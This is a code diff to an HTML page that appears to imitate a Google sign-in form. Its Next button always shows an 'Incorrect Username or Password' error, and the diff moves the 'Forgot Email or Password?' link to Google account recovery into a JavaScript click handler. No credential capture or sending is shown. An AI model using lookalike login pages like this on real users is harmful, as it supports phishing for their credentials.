@@ -106,7 +106,7 @@
             <input type="email" placeholder="Email">
             <input type="password" placeholder="Password">
             <p class="error">Incorrect Username or Password. Please try again.</p>
-            <a href="https://accounts.google.com/signin/v2/usernamerecovery?theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin">Forgot Email or Password?</a>
+            <p id="forgot">Forgot Email or Password?</p>
         </form>
         <button onclick="next()">Next</button>
     </main>
@@ -115,6 +115,12 @@
             const error = document.querySelector(".error");
             error.style.display = "block";
         }
+
+        const forgot = document.getElementById("forgot");
+
+        forgot.addEventListener("click", function() {
+            window.open("https://accounts.google.com/signin/v2/usernamerecovery?theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin");
+        })
     </script>
 </body>
 </html>
